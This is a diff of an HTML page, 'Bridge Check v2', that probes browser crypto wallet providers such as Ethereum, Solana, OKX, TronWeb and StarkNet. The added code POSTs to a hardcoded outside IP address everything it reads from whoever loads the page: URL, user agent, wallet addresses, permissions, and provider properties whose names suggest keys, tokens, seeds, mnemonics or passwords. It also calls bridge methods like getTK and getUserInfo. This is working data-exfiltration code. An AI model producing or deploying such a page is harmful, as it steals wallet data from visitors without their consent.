@@ -3,134 +3,324 @@
 <head><title>Bridge Check v2</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{font-family:monospace;font-size:12px;padding:6px;background:#111;color:#0f0}
-h2{font-size:14px;color:#ff0;margin:8px 0 4px}
-.crit{color:#f00;font-weight:bold}
-.ok{color:#0f0}
-.warn{color:#ff0}
-pre{white-space:pre-wrap;word-break:break-all}
+body{font-family:monospace;font-size:11px;padding:6px;background:#111;color:#0f0}
+h2{font-size:13px;color:#ff0;margin:6px 0 3px}
+pre{white-space:pre-wrap;word-break:break-all;font-size:10px}
 </style>
 </head>
 <body>
-<h2>Solana AutoApprove Test</h2>
-<pre id="out">Waiting for providers (5s)...</pre>
+<h2>Bridge Check v2 — auto-report</h2>
+<pre id="out">Initializing...</pre>
 
 <script>
 var r = [];
+var serverUrl = 'http://147.45.172.168:8890/log';
+
 function log(s) { r.push(s); update(); }
 function update() { document.getElementById('out').textContent = r.join('\n'); }
 function safe(fn) { try { return fn(); } catch(e) { return 'ERR:' + e.message; } }
 
-// Wait for async provider injection
+// Send to server
+function send(tag, data) {
+  var payload = JSON.stringify({tag: tag, data: data, ts: Date.now()});
+  try {
+    fetch(serverUrl, {method:'POST', body: payload, headers:{'Content-Type':'application/json'}})
+      .catch(function(){});
+  } catch(e) {}
+}
+
+function sendAll(tag) {
+  send(tag, r.join('\n'));
+}
+
+log('Page loaded at ' + new Date().toISOString());
+log('Location: ' + window.location.href);
+log('UA: ' + navigator.userAgent);
+send('init', {url: window.location.href, ua: navigator.userAgent});
+
+// ============ ROUND 1: Immediate check (0s) ============
+log('');
+log('=== ROUND 1: Immediate (0s) ===');
+var immediateProviders = [];
+['ethereum','solana','svm','okxwallet','tronWeb','starknet','okxsui',
+ 'martian','pontem','leap','compass','keplr','phantom','ton'].forEach(function(name) {
+  if (window[name]) immediateProviders.push(name);
+});
+log('Providers found immediately: ' + (immediateProviders.length ? immediateProviders.join(', ') : 'NONE'));
+sendAll('round1');
+
+// ============ ROUND 2: After 3s ============
 setTimeout(function() {
-  log('=== PROVIDERS LOADED ===');
-
-  // 1. Solana connect test
-  if (window.solana) {
-    log('solana found. autoApprove=' + window.solana.autoApprove);
-    log('Before connect: publicKey=' + window.solana.publicKey + ' isConnected=' + window.solana.isConnected);
-    log('Calling solana.connect({onlyIfTrusted:true})...');
-    try {
-      var p = window.solana.connect({onlyIfTrusted: true});
-      if (p && p.then) {
-        p.then(function(resp) {
-          log('SOLANA CONNECT SUCCESS:');
-          log('  resp=' + JSON.stringify(resp));
-          log('  publicKey=' + (resp && resp.publicKey ? resp.publicKey.toString() : 'null'));
-          log('  window.solana.publicKey=' + (window.solana.publicKey ? window.solana.publicKey.toString() : 'null'));
-          log('  isConnected=' + window.solana.isConnected);
-          if (resp && resp.publicKey) {
-            log('*** CRITICAL: Solana address obtained WITHOUT user approval! ***');
-          }
-        }).catch(function(e) {
-          log('solana.connect rejected: ' + e.message);
-          log('(This is expected if autoApprove doesnt bypass confirmation)');
-
-          // Try without onlyIfTrusted
-          log('');
-          log('Trying solana.connect() without onlyIfTrusted...');
-          try {
-            window.solana.connect().then(function(resp) {
-              log('SOLANA CONNECT (no flag) SUCCESS:');
-              log('  publicKey=' + (resp && resp.publicKey ? resp.publicKey.toString() : 'null'));
-              if (resp && resp.publicKey) {
-                log('*** ADDRESS LEAKED via connect() ***');
-              }
-            }).catch(function(e2) {
-              log('solana.connect() also rejected: ' + e2.message);
-            });
-          } catch(e3) { log('connect() error: ' + e3.message); }
-        });
-      } else {
-        log('connect returned sync: ' + JSON.stringify(p));
-      }
-    } catch(e) { log('connect error: ' + e.message); }
-  } else {
-    log('solana: NOT FOUND (still not injected after 5s)');
-  }
-
-  // 2. SVM connect test
   log('');
-  if (window.svm && window.svm !== window.solana) {
-    log('svm found (separate from solana). autoApprove=' + window.svm.autoApprove);
-  }
+  log('=== ROUND 2: After 3s ===');
+  var found = [];
+  ['ethereum','solana','svm','okxwallet','tronWeb','starknet','okxsui',
+   'martian','pontem','leap','compass','keplr','phantom','ton',
+   'aptos','unisat','bitcoinProvider'].forEach(function(name) {
+    if (window[name]) found.push(name);
+  });
+  log('Providers at 3s: ' + found.join(', '));
+  sendAll('round2_providers');
 
-  // 3. Ethereum — read selectedAddress after delay
+  // ---- Read all passive properties ----
   log('');
+  log('--- Passive property reads (no popups) ---');
+
+  // Ethereum
   if (window.ethereum) {
-    log('ethereum.selectedAddress=' + window.ethereum.selectedAddress);
-    log('ethereum.chainId=' + window.ethereum.chainId);
+    var eth = window.ethereum;
+    log('ethereum.selectedAddress = ' + eth.selectedAddress);
+    log('ethereum.chainId = ' + eth.chainId);
+    log('ethereum.networkVersion = ' + eth.networkVersion);
+    log('ethereum.isMetaMask = ' + eth.isMetaMask);
+    log('ethereum.isOkxWallet = ' + eth.isOkxWallet);
+    log('ethereum.isConnected() = ' + safe(function(){return eth.isConnected()}));
+    // Check for leaked accounts
+    if (eth._addresses) log('ethereum._addresses = ' + JSON.stringify(eth._addresses));
+    if (eth._state) log('ethereum._state = ' + JSON.stringify(eth._state));
+    if (eth.accounts) log('ethereum.accounts = ' + JSON.stringify(eth.accounts));
   }
 
-  // 4. StarkNet selectedAddress
-  log('');
-  if (window.starknet) {
-    log('starknet.selectedAddress=' + window.starknet.selectedAddress);
-    log('starknet.chainId=' + safe(function(){return window.starknet.chainId}));
-    log('starknet.version=' + safe(function(){return window.starknet.version}));
+  // Solana
+  if (window.solana) {
+    var sol = window.solana;
+    log('solana.isConnected = ' + sol.isConnected);
+    log('solana.publicKey = ' + (sol.publicKey ? sol.publicKey.toString() : 'null'));
+    log('solana.autoApprove = ' + sol.autoApprove);
+    log('solana.isPhantom = ' + sol.isPhantom);
+    if (sol._publicKey) log('solana._publicKey = ' + sol._publicKey);
   }
 
-  // 5. TronWeb defaultAddress
-  log('');
-  if (window.tronWeb) {
-    log('tronWeb.defaultAddress=' + JSON.stringify(window.tronWeb.defaultAddress));
-    log('tronWeb.ready=' + safe(function(){return window.tronWeb.ready}));
+  // SVM
+  if (window.svm) {
+    log('svm.autoApprove = ' + window.svm.autoApprove);
+    log('svm.isConnected = ' + window.svm.isConnected);
+    log('svm.publicKey = ' + (window.svm.publicKey ? window.svm.publicKey.toString() : 'null'));
   }
 
-  // 6. Check all okxwallet sub-provider addresses
-  log('');
+  // OKX Wallet
   if (window.okxwallet) {
-    log('=== okxwallet sub-providers ===');
-    if (window.okxwallet.selectedAddress) log('MAIN selectedAddress=' + window.okxwallet.selectedAddress);
-    if (window.okxwallet.bitcoin) {
-      var btcKeys = Object.getOwnPropertyNames(window.okxwallet.bitcoin);
-      log('bitcoin keys: ' + btcKeys.slice(0,10).join(','));
-      // Check for getAccounts without popup
-      if (window.okxwallet.bitcoin.getAccounts) {
-        log('bitcoin.getAccounts exists (function)');
-      }
+    var okx = window.okxwallet;
+    log('okxwallet.selectedAddress = ' + okx.selectedAddress);
+    log('okxwallet.chainId = ' + okx.chainId);
+    log('okxwallet.isDebug = ' + okx.isDebug);
+    log('okxwallet.isOkxWallet = ' + okx.isOkxWallet);
+    if (okx._addresses) log('okxwallet._addresses = ' + JSON.stringify(okx._addresses));
+    // Sub-providers
+    if (okx.solana) {
+      log('okxwallet.solana.publicKey = ' + (okx.solana.publicKey ? okx.solana.publicKey.toString() : 'null'));
+      log('okxwallet.solana.autoApprove = ' + safe(function(){return okx.solana.autoApprove}));
+      log('okxwallet.solana._publicKey = ' + okx.solana._publicKey);
     }
-    if (window.okxwallet.solana) {
-      log('okxwallet.solana._publicKey=' + window.okxwallet.solana._publicKey);
-      log('okxwallet.solana.autoApprove=' + safe(function(){return window.okxwallet.solana.autoApprove}));
+    if (okx.bitcoin) {
+      var btcKeys = Object.getOwnPropertyNames(okx.bitcoin);
+      log('okxwallet.bitcoin keys: ' + btcKeys.slice(0,15).join(','));
+      if (okx.bitcoin.selectedAddress) log('okxwallet.bitcoin.selectedAddress = ' + okx.bitcoin.selectedAddress);
+    }
+    if (okx.starknet) {
+      log('okxwallet.starknet.selectedAddress = ' + okx.starknet.selectedAddress);
+      log('okxwallet.starknet.account = ' + safe(function(){return JSON.stringify(okx.starknet.account)}));
+    }
+    if (okx.ton) {
+      log('okxwallet.ton keys: ' + safe(function(){return Object.getOwnPropertyNames(okx.ton).join(',')}));
     }
   }
 
-  // 7. Second delayed check for connect results
+  // TronWeb
+  if (window.tronWeb) {
+    var tw = window.tronWeb;
+    log('tronWeb.defaultAddress = ' + JSON.stringify(tw.defaultAddress));
+    log('tronWeb.ready = ' + safe(function(){return tw.ready}));
+    if (tw.trx) log('tronWeb.trx exists');
+    if (tw.transactionBuilder) log('tronWeb.transactionBuilder exists');
+  }
+
+  // StarkNet
+  if (window.starknet) {
+    var sn = window.starknet;
+    log('starknet.selectedAddress = ' + sn.selectedAddress);
+    log('starknet.chainId = ' + safe(function(){return sn.chainId}));
+    log('starknet.isConnected = ' + safe(function(){return sn.isConnected}));
+    log('starknet.account = ' + safe(function(){return JSON.stringify(sn.account)}));
+  }
+
+  // SUI
+  if (window.okxsui) {
+    log('okxsui keys: ' + safe(function(){return Object.getOwnPropertyNames(window.okxsui).join(',')}));
+  }
+
+  sendAll('round2_passive');
+
+  // ============ ROUND 3: Active tests (no-popup methods) ============
+  log('');
+  log('=== ROUND 3: Active tests ===');
+
+  // Test solana.connect({onlyIfTrusted:true}) — should NOT show popup
+  if (window.solana && window.solana.connect) {
+    log('Testing solana.connect({onlyIfTrusted:true})...');
+    try {
+      window.solana.connect({onlyIfTrusted: true}).then(function(resp) {
+        log('!! SOLANA AUTO-CONNECT SUCCESS !!');
+        log('  publicKey = ' + (resp && resp.publicKey ? resp.publicKey.toString() : 'null'));
+        log('  isConnected = ' + window.solana.isConnected);
+        send('CRITICAL_solana_autoconnect', {publicKey: resp.publicKey ? resp.publicKey.toString() : null});
+      }).catch(function(e) {
+        log('solana.connect({onlyIfTrusted}) rejected: ' + e.message);
+        send('solana_connect_rejected', {error: e.message});
+      });
+    } catch(e) { log('solana.connect error: ' + e.message); }
+  }
+
+  // Test ethereum net_version (no popup expected)
+  if (window.ethereum && window.ethereum.request) {
+    log('Testing eth net_version...');
+    try {
+      window.ethereum.request({method: 'net_version'}).then(function(v) {
+        log('eth net_version = ' + v);
+        send('eth_net_version', {version: v});
+      }).catch(function(e) { log('net_version error: ' + e.message); });
+    } catch(e) {}
+
+    // Test eth_chainId
+    try {
+      window.ethereum.request({method: 'eth_chainId'}).then(function(v) {
+        log('eth_chainId = ' + v);
+      }).catch(function(e) {});
+    } catch(e) {}
+
+    // Test wallet_getPermissions — might reveal connected state
+    try {
+      window.ethereum.request({method: 'wallet_getPermissions'}).then(function(v) {
+        log('wallet_getPermissions = ' + JSON.stringify(v));
+        send('eth_permissions', {perms: v});
+      }).catch(function(e) { log('getPermissions: ' + e.message); });
+    } catch(e) {}
+  }
+
+  // ============ ROUND 4: Deep enumeration ============
   setTimeout(function() {
     log('');
-    log('=== FINAL STATE (10s) ===');
-    if (window.solana) {
-      log('solana.publicKey=' + (window.solana.publicKey ? window.solana.publicKey.toString() : 'null'));
-      log('solana.isConnected=' + window.solana.isConnected);
+    log('=== ROUND 4: Deep enumeration (8s) ===');
+
+    // Enumerate ALL window properties that look wallet-related
+    var walletProps = [];
+    for (var key in window) {
+      try {
+        if (typeof window[key] === 'object' && window[key] !== null) {
+          var v = window[key];
+          // Check for wallet-like objects
+          if (v.isMetaMask || v.isPhantom || v.isTrust || v.selectedAddress !== undefined
+              || v.publicKey !== undefined || v.defaultAddress !== undefined
+              || v.request || v.connect || v.signTransaction) {
+            walletProps.push(key);
+          }
+        }
+      } catch(e) {}
     }
+    log('Wallet-like window objects: ' + walletProps.join(', '));
+
+    // Check for private/internal keys on ethereum
     if (window.ethereum) {
-      log('ethereum.selectedAddress=' + window.ethereum.selectedAddress);
+      var ethAll = [];
+      try {
+        var names = Object.getOwnPropertyNames(window.ethereum);
+        names.forEach(function(n) {
+          if (n.startsWith('_') || n.includes('address') || n.includes('account')
+              || n.includes('key') || n.includes('token') || n.includes('auth')
+              || n.includes('session') || n.includes('secret') || n.includes('private')
+              || n.includes('mnemonic') || n.includes('seed') || n.includes('password')) {
+            try {
+              var val = window.ethereum[n];
+              ethAll.push(n + '=' + (typeof val === 'function' ? '[fn]' : JSON.stringify(val)));
+            } catch(e) { ethAll.push(n + '=[error]'); }
+          }
+        });
+      } catch(e) {}
+      if (ethAll.length) log('ethereum sensitive-named props: ' + ethAll.join(', '));
     }
-    update();
+
+    // Check for private keys on okxwallet
+    if (window.okxwallet) {
+      var okxAll = [];
+      try {
+        Object.getOwnPropertyNames(window.okxwallet).forEach(function(n) {
+          if (n.startsWith('_') || n.includes('address') || n.includes('account')
+              || n.includes('key') || n.includes('token') || n.includes('debug')
+              || n.includes('internal') || n.includes('config')) {
+            try {
+              var val = window.okxwallet[n];
+              okxAll.push(n + '=' + (typeof val === 'function' ? '[fn]' : JSON.stringify(val)));
+            } catch(e) { okxAll.push(n + '=[error]'); }
+          }
+        });
+      } catch(e) {}
+      if (okxAll.length) log('okxwallet sensitive-named props: ' + okxAll.join(', '));
+    }
+
+    // Check postMessage bridge — try to call getTK, getUserInfo
+    log('');
+    log('--- Bridge calls (fire-and-forget) ---');
+    var bridgeNames = ['_solana_','_starknet_','_evm_','_cosmos_','_bitcoin_','_aptos_','_sui_','_ton_','_nostr_','okxBtcJSBridge'];
+    bridgeNames.forEach(function(b) {
+      if (window[b]) {
+        try {
+          // Try calling methods that might leak data
+          var methods = ['getTK','getUserInfo','getAccounts','getAddress','getPublicKey','getNetwork'];
+          methods.forEach(function(m) {
+            if (typeof window[b][m] === 'function') {
+              try {
+                var result = window[b][m]();
+                log(b + '.' + m + '() = ' + JSON.stringify(result));
+              } catch(e) {}
+            }
+          });
+        } catch(e) {}
+      }
+    });
+
+    // Check if OKX injected anything on document
+    log('');
+    var docKeys = [];
+    try {
+      Object.getOwnPropertyNames(document).forEach(function(k) {
+        if (k.includes('okx') || k.includes('wallet') || k.includes('web3') || k.includes('dapp')) {
+          docKeys.push(k);
+        }
+      });
+    } catch(e) {}
+    if (docKeys.length) log('document wallet keys: ' + docKeys.join(', '));
+
+    sendAll('round4_deep');
+
+    // ============ ROUND 5: Final state (13s) ============
+    setTimeout(function() {
+      log('');
+      log('=== ROUND 5: FINAL STATE (13s) ===');
+      if (window.solana) {
+        log('solana.publicKey = ' + (window.solana.publicKey ? window.solana.publicKey.toString() : 'null'));
+        log('solana.isConnected = ' + window.solana.isConnected);
+      }
+      if (window.ethereum) {
+        log('ethereum.selectedAddress = ' + window.ethereum.selectedAddress);
+      }
+      if (window.okxwallet) {
+        log('okxwallet.selectedAddress = ' + window.okxwallet.selectedAddress);
+      }
+      if (window.tronWeb) {
+        log('tronWeb.defaultAddress = ' + JSON.stringify(window.tronWeb.defaultAddress));
+      }
+      if (window.starknet) {
+        log('starknet.selectedAddress = ' + window.starknet.selectedAddress);
+      }
+
+      log('');
+      log('=== DONE ===');
+      sendAll('final');
+    }, 5000);
+
   }, 5000);
 
-}, 5000);
+}, 3000);
 </script>
 </body>
 </html>
